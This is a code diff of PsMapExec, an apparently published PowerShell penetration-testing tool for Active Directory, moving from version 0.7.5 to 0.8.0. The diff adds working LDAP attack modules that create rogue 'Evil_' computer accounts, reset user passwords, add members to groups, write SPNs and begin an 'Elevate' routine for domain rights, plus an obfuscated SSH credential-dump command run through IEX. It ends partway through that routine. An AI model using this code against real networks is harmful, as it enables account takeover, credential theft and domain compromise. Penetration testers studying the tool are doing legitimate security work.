@@ -14,7 +14,7 @@ Function PsMapExec {
         [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [String]$Username,
 
-        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [Parameter(Mandatory = $False, Position = 0, ParameterSetName = 'Default')]
         [String]$Method,
 
         [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
@@ -101,8 +101,41 @@ Function PsMapExec {
 
         [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [ValidatePattern('^[cugt]+$')]
-        [string]$Obfuscate
+        [string]$Obfuscate,
+
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [switch]$UserDN,
+
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [string]$ToggleAccount,
+
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [switch]$AddComputer,
+
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [string]$RemoveComputer,
+
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [string]$TargetDN,
+
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [string]$GroupDN,
+
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [string]$SID,
+
+        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [switch]$Pre2k
+
+
     )
+
+
+    if (-not $PSBoundParameters.ContainsKey('Method') -and $args.Count -ge 1) {
+        $Module = $args[0]
+    }
+
+
 
     function Write-Log {
         param (
@@ -336,7 +369,7 @@ Documentation: https://viperone.gitbook.io/pentest-everything/psmapexec
                                                                  
 
 Github  : https://github.com/The-Viper-One
-Version : 0.7.5")
+Version : 0.8.0")
 
     # Display banner once then prevent for consecutive execution
     Function DisplayBanner {
@@ -368,11 +401,12 @@ Version : 0.7.5")
         return
     }
 
-    
-
     $PME = Join-Path $WorkingDirectory "PME"
     $BloodHound = Join-Path $PME "BloodHound"
     $ConsoleHistory = Join-Path $PME "Console History"
+    $DCSyncDir = Join-Path $PME "DCSync"
+    $DCSyncFullDump = Join-Path $DCSyncDir "DCSync_Full_Dump"
+    $DCSyncUser = Join-Path $DCSyncDir "DCSync_User_Dump"
     $ekeys = Join-Path $PME "eKeys"
     $FileZilla = Join-Path $PME "FileZilla"
     $IPMI = Join-Path $PME "IPMI"
@@ -380,24 +414,23 @@ Version : 0.7.5")
     $LogonPasswords = Join-Path $PME "LogonPasswords"
     $LSA = Join-Path $PME "LSA"
     $LSADump = Join-Path $LSA "LSA-Dump"
-    $LSATrust = Join-path $LSA "LSA-Trusts"
+    $LSATrust = Join-Path $LSA "LSA-Trusts"
     $MDF = Join-Path $PME "MDF"
     $MSSQL = Join-Path $PME "MSSQL"
-    $DCSyncDir = Join-Path $PME "DCSync"
-    $DCSyncUser = Join-Path $DCSyncDir "DCSync_User_Dump"
-    $DCSyncFullDump = Join-Path $DCSyncDir "DCSync_Full_Dump"
     $NotePad = Join-Path $PME "Notepad"
+    $NTLM = Join-Path $PME "NTLM"
     $RDP = Join-Path $PME "RDP"
     $SAM = Join-Path $PME "SAM"
     $SCCM = Join-Path $PME "SCCM"
-    $Sessions = Join-Path $PME "Sessions"
     $SessionExec = Join-Path $PME "SessionExec"
-    $TGTDeleg = Join-Path $PME "TGTDeleg"
-    $NTLM = Join-Path $PME "NTLM"
     $SessionRelay = Join-Path $PME "Relay"
+    $Sessions = Join-Path $PME "Sessions"
     $SMB = Join-Path $PME "SMB"
     $Spraying = Join-Path $PME "Spraying"
+    $SSH = Join-Path $PME "SSH"
+    $TGTDeleg = Join-Path $PME "TGTDeleg"
     $Tickets = Join-Path $PME "Tickets"
+    $TimeRoast = Join-Path $PME "TimeRoast"
     $UserFiles = Join-Path $PME "User Files"
     $VNCRoot = Join-Path $PME "VNC"
     $VNCDump = Join-Path $VNCRoot "VNC Dump"
@@ -408,6 +441,9 @@ Version : 0.7.5")
     $directories = @(
         $BloodHound,
         $ConsoleHistory,
+        $DCSyncDir,
+        $DCSyncFullDump,
+        $DCSyncUser,
         $ekeys,
         $FileZilla,
         $IPMI,
@@ -418,27 +454,27 @@ Version : 0.7.5")
         $LSATrust,
         $MDF,
         $MSSQL,
-        $DCSyncDir,
-        $DCSyncUser,
-        $DCSyncFullDump,
+        $NotePad,
         $NTLM,
-        $Notepad,
         $RDP,
         $SAM,
         $SCCM,
-        $Sessions,
         $SessionExec,
         $SessionRelay,
+        $Sessions,
         $SMB,
         $Spraying,
-        $Tickets,
+        $SSH,
         $TGTDeleg,
+        $Tickets,
+        $TimeRoast,
         $UserFiles,
         $VNC,
         $VNCDump,
         $Wifi,
         $WinSCP
     )
+
 
     # Create PME Root folder first before populating
     if (-not (Test-Path $PME)) {
@@ -689,10 +725,12 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
             "Inject" {}
             "IPMI" {}
             "Kerberoast" {}
+            "LDAP" {}
+            "LDAPS" {}
             "MSSQL" {}
             "RDP" {}
-            "SessionHunter" {}
             "SMB" {}
+            "SessionHunter" {}
             "Spray" {}
             "VNC" {}
             "WMI" {}
@@ -702,17 +740,24 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                 Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                 Write-Host "Invalid Method specified"
                 Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
-                Write-Host "Specify either: All, GenRelayList, DCSync, Inject, IPMI, Kerberoast, MSSQL, RDP, SessionHunter, SMB, Spray, VNC, WMI, or WinRM"
+                Write-Host "Specify either: All, DCSync, GenRelayList, Inject, IPMI, Kerberoast, LDAP, LDAPS, MSSQL, RDP, SMB, SessionHunter, Spray, VNC, WMI, or WinRM"
                 return
             }
         }
     }
 
+
+    # Module Validation
     # Module Validation
     if ($Module -ne "") {
         switch ($Module) {
+            "AddComputer" {}
+            "AddRBCD" {}
+            "AddSPN" {}
+            "AddToGroup" {}
             "Amnesiac" {}
             "ConsoleHistory" {}
+            "Elevate" {}
             "eKeys" {}
             "FileZilla" {}
             "Files" {}
@@ -721,19 +766,29 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
             "LSA" {}
             "LSA-Trust" {}
             "MDF" {}
+            "MAQ" {}
             "Notepad" {}
             "NTDS" {}
             "NTLM" {}
+            "RemoveComputer" {}
+            "RemoveFromGroup" {}
+            "RemoveRBCD" {}
+            "RemoveSPN" {}
+            "ResetPassword" {}
             "RunAsPPL" {}
             "SAM" {}
             "SCCM" {}
+            "SSH" {}
             "SessionExec" {}
             "SessionRelay" {}
             "TGTDeleg" {}
             "Test" {}
             "Tickets" {}
+            "Timeroast" {}
+            "ToggleAccount" {}
             "VMCheck" {}
             "VNC" {}
+            "WHOAMI" {}
             "WiFi" {}
             "WinSCP" {}
             default {
@@ -741,11 +796,12 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                 Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                 Write-Host "Invalid Module specified"
                 Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
-                Write-Host "Specify either: Amnesiac, ConsoleHistory, eKeys, FileZilla, Files, KerbDump, LogonPasswords, LSA, LSA-Trust, MDF, Notepad, NTDS, NTLM, RunAsPPL, SAM, SCCM, SessionExec, SessionRelay, TGTDeleg, Test, Tickets, VNC, VMCheck, WiFi, or WinSCP."
+                Write-Host "Specify either: AddComputer, AddRBCD, AddSPN, AddToGroup, Amnesiac, ConsoleHistory, Elevate, ekeys, FileZilla, Files, KerbDump, LogonPasswords, LSA, LSA-Trust, MDF, MAQ, Notepad, NTDS, NTLM, RemoveComputer, RemoveFromGroup, RemoveRBCD, RemoveSPN, ResetPassword, RunAsPPL, SAM, SCCM, SSH, SessionExec, SessionRelay, TGTDeleg, Test, Tickets, Timeroast, ToggleAccount VMCheck, VNC, WHOAMI, WiFi, or WinSCP"
                 return
             }
         }
     }
+
 
     # Authentication Validation
     if ($Hash -ne "" -and $LocalAuth) {
@@ -864,7 +920,8 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
     }
 
     if ($Method -eq "Spray") {
-        if (!$EmptyPassword -and !$AccountAsPassword -and $SprayHash -eq "" -and $SprayPassword -eq "") {
+
+        if (!$EmptyPassword -and !$AccountAsPassword -and $SprayHash -eq "" -and $SprayPassword -eq "" -and (!$Pre2k)) {
             Write-Host
             Write-Host "[-] " -ForegroundColor Red -NoNewline
             Write-Host "We need something to spray"
@@ -876,28 +933,28 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
             return
         }
 
-        if ($SprayHash -ne "" -and $SprayPassword -ne "") {
+        elseif ($SprayHash -ne "" -and $SprayPassword -ne "") {
             Write-Host
             Write-Host "[-] " -ForegroundColor Red -NoNewline
             Write-Host "Hash and Password detected"
             return
         }
 
-        if (($EmptyPassword -and $SprayHash -ne "") -or ($EmptyPassword -and $SprayPassword -ne "")) {
+        elseif (($EmptyPassword -and $SprayHash -ne "") -or ($EmptyPassword -and $SprayPassword -ne "")) {
             Write-Host
             Write-Host "[-] " -ForegroundColor Red -NoNewline
             Write-Host "Password or hash value provided with -EmptyPassword"
             return
         }
 
-        if (($AccountAsPassword -and $SprayHash -ne "") -or ($AccountAsPassword -and $SprayPassword -ne "")) {
+        elseif (($AccountAsPassword -and $SprayHash -ne "") -or ($AccountAsPassword -and $SprayPassword -ne "")) {
             Write-Host
             Write-Host "[-] " -ForegroundColor Red -NoNewline
             Write-Host "Password or hash value provided with -AccountAsPassword"
             return
         }
 
-        if ($AccountAsPassword -and $EmptyPassword) {
+        elseif ($AccountAsPassword -and $EmptyPassword) {
             Write-Host
             Write-Host "[-] " -ForegroundColor Red -NoNewline
             Write-Host "Both -AccountAsPassword and -EmptyPassword provided"
@@ -977,6 +1034,45 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
     # Check if LocalAuth conflicts with anything
     if ($LocalAuth) {
         $CurrentUser = $True
+    }
+
+
+    # LDAP / LDAPS pre-flight checks
+
+    if ($Method -eq "LDAPS") {
+        $LDAPS = $true 
+    }
+
+    else {
+
+        $LDAPS = $false
+
+    }
+
+    $LDAPModules = @("whoami", "MAQ", "AddSPN", "RemoveSPN", "AddToGroup", "RemoveFromGroup", "ToggleAccount", "ResetPassword", "AddComputer", "RemoveComputer", "Elevate")
+
+    if ($LDAPModules -contains $Module -and $Method -notin @("LDAP", "LDAPS")) {
+        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "Module '$Module' requires LDAP (PsMapExec LDAP -Targets DC01 -Module $Module)"
+        return
+    }
+
+    if (@("AddRBCD", "RemoveRBCD", "AddSPN", "RemoveSPN", "AddToGroup", "RemoveFromGroup", "ToggleAccount", "ResetPassword", "RemoveComputer", "Elevate") -contains $Module -and !$TargetDN) {
+        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "Module '$Module' requires -TargetDN (Specify target DN)"
+        return
+    }
+
+    if (@("AddToGroup", "RemoveFromGroup") -contains $Module -and !$GroupDN) {
+        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+        Write-Host "Module '$Module' requires -GroupDN (Specify group DN)"
+        return
+    }
+
+    if ($Module -eq "AddRBCD" -and !$SID) {
+        Write-Host "[*] " -ForegroundColor Yellow -NoNewline
+        Write-Host "A SID is required to grant rights to ""-SID S-1-5-21-13999771-..."""
+        return
     }
 
 
@@ -1613,6 +1709,8 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
         # Prefix
         switch ($Method) {
             "DCSync" { Write-Host "DCSync" -ForegroundColor "Yellow" -NoNewline }
+            "LDAP" { Write-Host "LDAP" -ForegroundColor "Yellow" -NoNewline }
+            "LDAPS" { Write-Host "LDAPS" -ForegroundColor "Yellow" -NoNewline }
             "SMB" { Write-Host "SMB" -ForegroundColor "Yellow" -NoNewline }
             "WMI" { Write-Host "WMI" -ForegroundColor "Yellow" -NoNewline }
             "WinRM" { Write-Host "WinRM" -ForegroundColor "Yellow" -NoNewline }
@@ -1673,7 +1771,7 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
     ########################################## Domain Target Acquisition ###########################################
     ################################################################################################################
 
-    $ComputerTargetMethods = @("SMB", "WMI", "SessionHunter", "WinRM", "RDP", "VNC", "IPMI", "MSSQL", "GenRelayList", "All", "DCSync")
+    $ComputerTargetMethods = @("SMB", "WMI", "SessionHunter", "WinRM", "RDP", "VNC", "IPMI", "MSSQL", "GenRelayList", "All", "DCSync", "LDAP", "LDAPS")
     $UserTargetMethods = @("Kerberoast", "Spray")
 
 
@@ -2298,10 +2396,6 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
         }
     }
 
-
-
-
-
     if ($Method -eq "IPMI" -and $Option -eq "IPMI:DomainUsers") {
         Write-Log -Message  "Performing user LDAP queries for method (IPMI)"
         $searcher = New-Searcher
@@ -2362,8 +2456,8 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
             return $null
         }
     }
-    # Not needed at the moment
-    #$ComputerSamAccounts = Get-ComputerAccounts
+    
+    $ComputerSamAccounts = Get-ComputerAccounts
 
 
     if (!$LocalAuth) { 
@@ -2563,6 +2657,7 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
         "SCCM"           = "SCCM output will be written to $SCCM"
         "SessionExec"    = "SessionExec output will be written to $SessionExec"
         "Tickets"        = "Tickets will be written to $MimiTickets"
+        "Timeroast"      = "Timeroast will be written to $Timeroast"
         "TGTDeleg"       = "TGTDeleg output will be written to $TGTDeleg"
         "VNC"            = "VNC Passwords output will be written to $VNCDump"
         "Wifi"           = "Wi-Fi output will be written to $Wifi"
@@ -3045,6 +3140,19 @@ $rbs ; `$b = (invoke-rtickets send /nowrap) ; (`$b | Select-String -Pattern 'doI
         $IV = Generate-RandomString 16  
         
         $Command = $LocalWifi
+        $Command = obfuscation-arguments
+
+        $Data = Invoke-AES -k $Key -iv $IV -t $Command
+        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX"
+    }
+
+    # SSH
+    elseif ($Module -eq "SSH") {
+        
+        $Key = Generate-RandomString 32
+        $IV = Generate-RandomString 16  
+        
+        $Command = $LocalSSH
         $Command = obfuscation-arguments
 
         $Data = Invoke-AES -k $Key -iv $IV -t $Command
@@ -3578,6 +3686,7 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                                 "SCCM" { "$SCCM\$($runspace.ComputerName)-SCCM.txt" }
                                 "SessionExec" { "$SessionExec\$($runspace.ComputerName)-SessionExec.txt" }
                                 "SessionRelay" { "$SessionRelay\$($runspace.ComputerName)-SessionRelay.txt" }
+                                "SSH" { "$SSH\$($runspace.ComputerName)-SSH.txt" }
                                 "TGTDeleg" { "$TGTDeleg\$($runspace.ComputerName)-TGTDeleg.txt" }
                                 "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                                 "VNC" { "$VNCDump\$($runspace.ComputerName)-VNC.txt" }
@@ -4046,6 +4155,7 @@ while (`$true) {
                                 "SCCM" { "$SCCM\$($runspace.ComputerName)-SCCM.txt" }
                                 "SessionExec" { "$SessionExec\$($runspace.ComputerName)-SessionExec.txt" }
                                 "SessionRelay" { "$SessionRelay\$($runspace.ComputerName)-SessionRelay.txt" }
+                                "SSH" { "$SSH\$($runspace.ComputerName)-SSH.txt" }
                                 "TGTDeleg" { "$TGTDeleg\$($runspace.ComputerName)-TGTDeleg.txt" }
                                 "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                                 "VNC" { "$VNCDump\$($runspace.ComputerName)-VNC.txt" }
@@ -4457,6 +4567,7 @@ while (`$true) {
                                 "SCCM" { "$SCCM\$($runspace.ComputerName)-SCCM.txt" }
                                 "SessionExec" { "$SessionExec\$($runspace.ComputerName)-SessionExec.txt" }
                                 "SessionRelay" { "$SessionRelay\$($runspace.ComputerName)-SessionRelay.txt" }
+                                "SSH" { "$SSH\$($runspace.ComputerName)-SSH.txt" }
                                 "TGTDeleg" { "$TGTDeleg\$($runspace.ComputerName)-TGTDeleg.txt" }
                                 "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                                 "VNC" { "$VNCDump\$($runspace.ComputerName)-VNC.txt" }
@@ -5676,6 +5787,7 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
                                 "SCCM" { "$SCCM\$($runspace.ComputerName)-SCCM.txt" }
                                 "SessionExec" { "$SessionExec\$($runspace.ComputerName)-SessionExec.txt" }
                                 "SessionRelay" { "$SessionRelay\$($runspace.ComputerName)-SessionRelay.txt" }
+                                "SSH" { "$SSH\$($runspace.ComputerName)-SSH.txt" }
                                 "TGTDeleg" { "$TGTDeleg\$($runspace.ComputerName)-TGTDeleg.txt" }
                                 "Tickets" { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                                 "VNC" { "$VNCDump\$($runspace.ComputerName)-VNC.txt" }
@@ -5880,6 +5992,588 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-W
         $runspacePool.Dispose()
     }
 
+    ################################################################################################################
+    ################################################ Function: LDAP ################################################
+    ################################################################################################################
+    Function Method-LDAP {
+        param ($ComputerName)
+        
+        Write-host
+        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
+        $runspacePool.Open()
+        $runspaces = New-Object System.Collections.ArrayList
+
+        $scriptBlock = {
+            param ($computerName, $Command, $Username, $Password, $LocalAuth, $Timeout, $Module, $TargetDN, $GroupDN, $SID, $LDAPS, $Timeroast, $ShowOutput)
+
+            function Get-RandomString { -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) }
+
+            $tcpClient = New-Object System.Net.Sockets.TcpClient
+
+            if ($LDAPS) { $asyncResult = $tcpClient.BeginConnect($ComputerName, 636, $null, $null) }
+            else { $asyncResult = $tcpClient.BeginConnect($ComputerName, 389, $null, $null) }
+            
+            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout)
+
+            if ($wait) {
+                try {
+                    $tcpClient.EndConnect($asyncResult)
+                    $connected = $true
+                }
+                catch {
+                    $connected = $false
+                }
+            }
+            else {
+                $connected = $false
+            }
+
+            $tcpClient.Close()
+            
+            if (!$connected) { return "Unable to connect" }
+
+            try {
+                try { Add-Type -AssemblyName System.DirectoryServices.Protocols -ErrorAction SilentlyContinue } catch {}
+
+                try {
+                    
+                    if ($LDAPS) {
+
+                        $LdapIdentifier = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($ComputerName, 636)
+                        $LdapConnection = New-Object System.DirectoryServices.Protocols.LdapConnection($LdapIdentifier)
+                        $LdapConnection.SessionOptions.SecureSocketLayer = $true
+
+                    }
+
+                    else {
+
+                        $LdapIdentifier = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($ComputerName, 389)
+                        $LdapConnection = New-Object System.DirectoryServices.Protocols.LdapConnection($LdapIdentifier)
+                        $LdapConnection.SessionOptions.Sealing = $true
+                        $LdapConnection.SessionOptions.Signing = $true
+
+                    }
+                    
+
+                    # Bind to test the connection, might have to drop this when authenticating with a certificate?
+                    $LdapConnection.Bind()
+
+                }
+                
+                catch { return "LDAP Failure: $_" }
+
+                if ($Module -eq "whoami") {
+                    $WhoamiRequest = New-Object System.DirectoryServices.Protocols.ExtendedRequest("1.3.6.1.4.1.4203.1.11.3")
+                    $Response = $LdapConnection.SendRequest($WhoamiRequest)
+
+                    if ($Response.ResponseValue) {
+                        $WhoamiResult = [System.Text.Encoding]::UTF8.GetString($Response.ResponseValue)
+                        $Identity = $WhoamiResult.Split(':')[1].Trim()
+                        $Result = "Authenticated as $Identity"
+                        return $Result
+                    }
+                }
+
+                if ($Module -eq "MAQ") {
+
+                    $Searcher = [System.DirectoryServices.DirectorySearcher]::new()
+                    $SearchBase = $Searcher.SearchRoot.Path.Replace("LDAP://", "")
+                    $searchRequest = New-Object System.DirectoryServices.Protocols.SearchRequest($SearchBase, "(objectClass=domainDNS)", [System.DirectoryServices.Protocols.SearchScope]::Base, @("ms-DS-MachineAccountQuota"))
+        
+                    $searchResponse = $LdapConnection.SendRequest($searchRequest)
+
+                    if ($searchResponse.Entries.Count -gt 0) {
+                        $entry = $searchResponse.Entries[0]
+                        $maq = $entry.Attributes["ms-DS-MachineAccountQuota"][0]
+                        return "`nMachine Account Quota: $maq`n"
+                
+                    }
+            
+                    else { return "LDAP_MAQ: No domainDNS object found." }
+                }
+
+                elseif ($Module -eq "AddSPN") {
+                
+                    $Value = Get-RandomString
+                    $NewSPN = "cifs/$Value.domain.com"
+                    $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($TargetDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Add, "servicePrincipalName", $NewSPN)
+                    $LdapConnection.SendRequest($ModifyRequest) > $null
+                    return "[*] Successfully set SPN ""cifs/$value.domain.com"" for $TargetDN"
+
+                }
+
+                elseif ($Module -eq "RemoveSPN") {
+
+                    $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($TargetDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete, "servicePrincipalName")
+                    $LdapConnection.SendRequest($ModifyRequest) > $null
+                    return "[*] Successfully Unset SPNs for $TargetDN"
+                }
+
+                elseif ($Module -eq "AddToGroup") {
+
+                    $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($GroupDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Add, "member", $TargetDN)
+                    $LdapConnection.SendRequest($ModifyRequest) > $null
+                    return "[*] Successfully added $TargetDN to $GroupDN"
+                }
+            
+                elseif ($Module -eq "RemoveFromGroup") {
+
+                    $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($GroupDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete, "member", $TargetDN)
+                    $LdapConnection.SendRequest($ModifyRequest) > $null
+                    return "[*] Successfully removed $TargetDN from $GroupDN"
+            
+                }
+
+                elseif ($Module -eq "ToggleAccount") {
+
+                    $Searcher = [System.DirectoryServices.DirectorySearcher]::new()
+                    $SearchBase = $Searcher.SearchRoot.Path.Replace("LDAP://", "")
+                
+                    $SearchRequest = [System.DirectoryServices.Protocols.SearchRequest]::new($TargetDN, "(|(objectClass=user)(objectClass=computer))", [System.DirectoryServices.Protocols.SearchScope]::Subtree, "userAccountControl")
+                    $SearchResponse = $LdapConnection.SendRequest($SearchRequest)
+        
+                    if ($SearchResponse.Entries.Count -gt 0) {
+                        $SearchResultEntry = $SearchResponse.Entries[0]
+                        $UserStatus = $SearchResultEntry.Attributes["userAccountControl"][0]
+        
+                        [int]$UserAccountControl = [int]($SearchResultEntry.Attributes["userAccountControl"][0].ToString())
+                        [int]$AccountDisable = 0x0002;
+        
+                        # Check if account is disabled and toggle status
+                        if (($UserAccountControl -band $AccountDisable) -gt 0) {
+        
+                            # Currently disabled - enable it (bitwise AND with NOT flag)
+                            $UserAccountControl = $UserAccountControl -band (-bnot $AccountDisable)
+        
+                            $UAC = $CurrentUAC -band (-bnot 0x0002)
+                            $UAC = $UAC.ToString()
+        
+                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($TargetDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, "userAccountControl", $UAC)
+                            $LdapConnection.SendRequest($ModifyRequest) > $null
+        
+                            return "[*] Enabled Account $TargetDN"
+                        }
+                    
+                        else {
+        
+                            # Currently enabled - disable it (bitwise OR with flag)
+                            $UserAccountControl = $UserAccountControl -bor $AccountDisable
+        
+                            $UAC = $CurrentUAC -bxor 0x0002
+                            $UAC = $UAC.ToString()
+        
+                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($TargetDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, "userAccountControl", $UAC)
+                            $LdapConnection.SendRequest($ModifyRequest) > $null
+        
+                            return "[*] Disabled Account $TargetDN"
+                        }
+                    }
+                
+                    else { throw "DistinguishedName $TargetDN not found" }
+                }
+
+                elseif ($Module -eq "ResetPassword") {
+                
+                    $NewPassword = Get-RandomString { -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object { [char]$_ }) }
+                    $NewPasswordBytes = [System.Text.Encoding]::Unicode.GetBytes('"' + $NewPassword + '"')           
+                    $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest($TargetDN, [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace, "unicodePwd", $NewPasswordBytes)
+                    $LdapConnection.SendRequest($ModifyRequest) > $null
+                
+                    return "[*] Successfully reset ""$TargetDN"" password to $NewPassword"
+
+                }
+
+                elseif ($Module -eq "AddComputer") {
+                
+                    function Get-RandomComputerName { -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 4 | ForEach-Object { [char]$_ }) }
+
+                    $PartialComputerName = Get-RandomComputerName
+                    $ComputerName = "Evil_$PartialComputerName"
+
+                    $ComputerPassword = Get-RandomString
+        
+                    $Password = [System.Text.Encoding]::Unicode.GetBytes('"' + $ComputerPassword + '"')
+                    $UnicodePwd = [byte[]]$Password
+        
+                    $Searcher = [System.DirectoryServices.DirectorySearcher]::new()
+                    $SearchBase = $Searcher.SearchRoot.Path.Replace("LDAP://", "")
+                    $Domain = ($SearchBase -split ',' -replace '^DC=', '' -join '.')
+                    $ComputerHostname = $ComputerName.TrimEnd('$')
+                    [string]$ComputerDN = "CN=$ComputerHostname,CN=Computers,$SearchBase"
+        
+                    $Spns = @("HOST/$ComputerHostname", "HOST/$ComputerHostname.$Domain", "RestrictedKrbHost/$ComputerHostname", "RestrictedKrbHost/$ComputerHostname.$Domain")
+        
+                    $AddRequest = New-Object -TypeName System.DirectoryServices.Protocols.AddRequest
+                    $AddRequest.DistinguishedName = $ComputerDN        
+                    $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "objectClass", "Computer")) > $null
+                    $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "SamAccountName", "$ComputerHostname$")) > $null
+                    $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "userAccountControl", "4096")) > $null  # Normal computer account
+                    $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "DnsHostName", "$ComputerHostname.$Domain")) > $null
+                    $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "ServicePrincipalName", $Spns)) > $null
+                    $AddRequest.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "unicodePwd", $UnicodePwd)) > $null
+        
+                    $LdapConnection.SendRequest($AddRequest) > $null
+        
+                    return "[*] Added Computer to $Domain! `n`n[*] Name     : $ComputerName `n[*] Pass     : $ComputerPassword `n[*] DN       : $ComputerDN"
+        
+                    $ComputerResults = New-Object PSObject
+                    $ComputerResults | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $ComputerName
+                    $ComputerResults | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $ComputerPassword
+                    $ComputerResults | Add-Member -MemberType "NoteProperty" -Name "DN" -Value $ComputerDN
+                    $ComputerResults | FT -AutoSize
+            
+
+                }
+
+                elseif ($Module -eq "RemoveComputer") {
+       
+                    # This should ideally validate we are actually removing a computer object
+                    $DeleteRequest = New-Object System.DirectoryServices.Protocols.DeleteRequest($TargetDN)
+                    $LdapConnection.SendRequest($DeleteRequest) > $null
+        
+                    return "[*] Successfully removed ""$TargetDN"" from the domain."
+
+                }
+
+                elseif ($Module -eq "Elevate") {
+            
+                    try {
+                
+                        $ObjectToElevate = $TargetDN
+                
+                        $Result = ""
+                        $Result += "[*] Retrieving SID of user $UserToElevate`n"
+                
+                        $SearchRequest = New-Object System.DirectoryServices.Protocols.SearchRequest($ObjectToElevate, "(objectClass=*)", [System.DirectoryServices.Protocols.SearchScope]::Base, "objectSid")
+            	
+                        try {
+                    
+                            $SearchResponse = $LdapConnection.SendRequest($SearchRequest)
+            		
+                            if ($SearchResponse.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) { throw "Failed to retrieve user SID: $($userResponse.ResultCode)" }
+                            $UserEntry = $SearchResponse.Entries[0]
+                            $UserSidBytes = $UserEntry.Attributes["objectSid"][0]
+                            $UserSid = New-Object System.Security.Principal.SecurityIdentifier($UserSidBytes, 0)
+                    
+                            $Result += "[*] User SID: $($UserSid.Value)`n"
+                        }
+                
+                        catch { $Result += "[!] Error retrieving user SID: $_`n" ; return $Result }
+        	
+                        $DomainDN = ($ObjectToElevate -split ',' | Where-Object { $_ -like 'DC=*' }) -join ','
+                        $Result += "[*] Domain DN: $DomainDN`n"
+        	
+                        # Retrieve domain's security descriptor
+                        $Result += "[*] Retrieving security descriptor for domain $DomainDN`n"
+                        $SearchDomainRequest = New-Object System.DirectoryServices.Protocols.SearchRequest($DomainDN, "(objectClass=*)", [System.DirectoryServices.Protocols.SearchScope]::Base, "nTSecurityDescriptor")
+        	
+                        $DomainResponse = $LdapConnection.SendRequest($SearchDomainRequest)
+            	
+                        if ($DomainResponse.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) { return "Failed to retrieve domain security descriptor: $($DomainResponse.ResultCode)" }
+        	
+                        $DomainEntry = $DomainResponse.Entries[0]
+                        $SdBytes = $DomainEntry.Attributes["nTSecurityDescriptor"][0]
+                        $Sd = New-Object System.Security.AccessControl.RawSecurityDescriptor($SdBytes, 0)
+        	
+                        $Result += "[*] Retrieved current security descriptor`n"
+                    }
+                
